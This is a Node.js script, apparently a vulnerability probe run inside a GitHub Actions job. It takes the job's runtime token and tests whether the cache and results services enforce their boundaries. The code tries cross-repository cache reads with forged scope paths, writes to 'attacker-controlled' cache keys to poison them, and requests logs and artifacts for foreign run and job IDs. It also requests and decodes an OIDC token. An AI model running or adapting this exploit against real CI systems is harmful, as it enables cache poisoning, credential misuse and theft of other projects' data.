// i11100 probe2: raw AMS cache/results boundary test with the recovered runtime token.
// Tests: (1) correct v2 CacheService endpoint (control), (2) cross-scope/repo path,
//        (3) cross-run plan/job in results receiver, (4) foreign scope on artifactcache v1.
const https = require('https');
const { URL } = require('url');

const RT = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE = process.env.ACTIONS_CACHE_URL || '';
const RESULTS = process.env.ACTIONS_RESULTS_URL || '';

function decode(t) { try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64').toString('utf8')); } catch (e) { return {}; } }
const CL = decode(RT);
console.log('CLAIMS_SLIM=' + JSON.stringify({ aud: CL.aud, plan_id: CL.plan_id, job_id: CL.job_id, run_id: CL.run_id, ac: CL.ac }));

function req(method, urlStr, tok, body, extraHeaders, timeoutMs) {
  return new Promise((resolve) => {
    let u; try { u = new URL(urlStr); } catch (e) { return resolve({ status: -1, body: 'BADURL' }); }
    const data = body === undefined || body === null ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const headers = Object.assign({ 'User-Agent': 'actions-cache/4.0.0' }, extraHeaders || {});
    if (tok) headers['Authorization'] = 'Bearer ' + tok;
    if (data !== null) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(data); }
    const r = https.request(u, { method, headers }, (resp) => {
      const ch = []; resp.on('data', d => ch.push(d));
      resp.on('end', () => resolve({ status: resp.statusCode, headers: resp.headers, body: Buffer.concat(ch).toString('utf8').slice(0, 900) }));
    });
    r.on('error', e => resolve({ status: -1, body: 'ERR ' + e.message }));
    r.setTimeout(timeoutMs || 20000, () => { r.destroy(); resolve({ status: -2, body: 'TIMEOUT' }); });
    if (data !== null) r.write(data);
    r.end();
  });
}
function show(name, r) { console.log(`P2 ${name} -> ${r.status} ${JSON.stringify(r.body).slice(0, 600)}`); }

(async () => {
  const cacheBase = CACHE.endsWith('/') ? CACHE : CACHE + '/';
  const resultsBase = RESULTS.endsWith('/') ? RESULTS : RESULTS + '/';
  const scopeSeg = (() => { try { return new URL(CACHE).pathname.split('/').filter(Boolean)[0]; } catch (e) { return ''; } })();
  console.log('SCOPE_SEG=' + scopeSeg);

  // ---- Control: correct v2 CacheService on RESULTS url (toolkit v4 uses this host) ----
  const v2 = 'twirp/github.actions.results.api.v1.CacheService/';
  const VER64 = 'a3f6dd22c5cc42e4cd63a2622f528935cb038639db1c8ae2720e10f6e6606dc7';
  show('v2_results_GetCacheEntryDownloadURL_knownver',
    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-poison', restoreKeys: [], version: VER64 }));
  show('v2_results_GetCacheEntryDownloadURL_randkey',
    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-probe-nope', restoreKeys: [], version: VER64 }));
  show('v2_results_CreateCacheEntry',
    await req('POST', resultsBase + v2 + 'CreateCacheEntry', RT, { key: 'i11100-probe-key', version: VER64 }));
  show('v2_results_GetCacheEntryDownloadURL_restorekeys',
    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-nomatch', restoreKeys: ['i11100-'], version: VER64 }));

  // cross-repo/scope attempt on the CORRECT results host with a foreign scope path prepended
  const hostOnly = (() => { try { return new URL(RESULTS).host; } catch (e) { return 'results-receiver.actions.githubusercontent.com'; } })();
  for (const fv of ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', '0000000000000000000000000000000000000000000']) {
    const fu = 'https://' + hostOnly + '/' + fv + '/' + v2 + 'GetCacheEntryDownloadURL';
    show('v2_results_foreign_scope_' + fv.slice(0, 4),
      await req('POST', fu, RT, { key: 'i11100-poison', restoreKeys: [], version: VER64 }));
  }
  // arbitrary-key write within our own scope: CreateCacheEntry for an attacker-chosen key
  show('v2_results_CreateCacheEntry_attacker_key',
    await req('POST', resultsBase + v2 + 'CreateCacheEntry', RT, { key: 'i11100-attacker-controlled', version: VER64 }));

  // ---- also try artifactcache host for v2 (in case) ----
  show('v2_artifactcache_GetCacheEntryDownloadURL',
    await req('POST', cacheBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-poison', restoreKeys: [], version: 'i11100ver' }));

  // ---- v1 legacy on artifactcache with proper Accept ----
  const acc = { 'Accept': 'application/json;api-version=6.0-preview.1' };
  show('v1_artifactcache_query_accept',
    await req('GET', cacheBase + '_apis/artifactcache/cache?keys=i11100-poison&version=i11100ver', RT, null, acc));

  // ---- foreign scope path on artifactcache (cross-repo attempt) ----
  for (const fv of ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', '0000000000000000000000000000000000000000000']) {
    const fu = 'https://' + new URL(CACHE).host + '/' + fv + '/_apis/artifactcache/cache?keys=i11100-poison&version=i11100ver';
    show('v1_foreign_scope_' + fv.slice(0, 4), await req('GET', fu, RT, null, acc));
  }

  // ---- results receiver: cross-run / foreign plan+job (twirp) ----
  const RES = resultsBase + 'twirp/results.services.receiver.Receiver/';
  show('RR_health', await req('GET', resultsBase + 'health', RT));
  show('RR_GetJobLogsSignedBlobURL_self',
    await req('POST', RES + 'GetJobLogsSignedBlobURL', RT, { workflowRunBackendId: CL.plan_id, workflowJobRunBackendId: CL.job_id }));
  show('RR_GetJobLogsSignedBlobURL_foreign',
    await req('POST', RES + 'GetJobLogsSignedBlobURL', RT, { workflowRunBackendId: 'aaaaaaaa-0000-0000-0000-000000000000', workflowJobRunBackendId: 'bbbbbbbb-0000-0000-0000-000000000000' }));
  show('RR_ArtifactService_ListArtifacts_self',
    await req('POST', resultsBase + 'twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', RT, { workflowRunBackendId: CL.plan_id, workflowJobRunBackendId: CL.job_id }));
  show('RR_ArtifactService_ListArtifacts_foreign',
    await req('POST', resultsBase + 'twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', RT, { workflowRunBackendId: 'aaaaaaaa-0000-0000-0000-000000000000', workflowJobRunBackendId: 'bbbbbbbb-0000-0000-0000-000000000000' }));

  // ---- token vs api.github.com ----
  show('RT_vs_api_repo', await req('GET', 'https://api.github.com/repos/StephenClash/helloworld', RT));

  // ---- OIDC id-token scope (is it run-bound?) ----
  const OIDCU = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const OIDCT = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
  if (OIDCU) {
    const r2 = await req('GET', OIDCU + (OIDCU.includes('?') ? '&' : '?') + 'audience=i11100aud', OIDCT);
    console.log('OIDC_REQ_STATUS=' + r2.status);
    try {
      const j = JSON.parse(r2.body); const v = j.value || '';
      const c = JSON.parse(Buffer.from(v.split('.')[1], 'base64').toString('utf8'));
      console.log('OIDC_CLAIMS=' + JSON.stringify({ aud: c.aud, sub: c.sub, exp: c.exp, iat: c.iat, nbf: c.nbf, jti: c.jti, repository_id: c.repository_id, run_id: c.run_id, ref: c.ref, sha: c.sha }));
    } catch (e) { console.log('OIDC_DECODE_ERR ' + e + ' ' + JSON.stringify(r2.body).slice(0, 200)); }
  } else { console.log('NO_OIDC_URL'); }
  console.log('=== P2 DONE ===');
})();
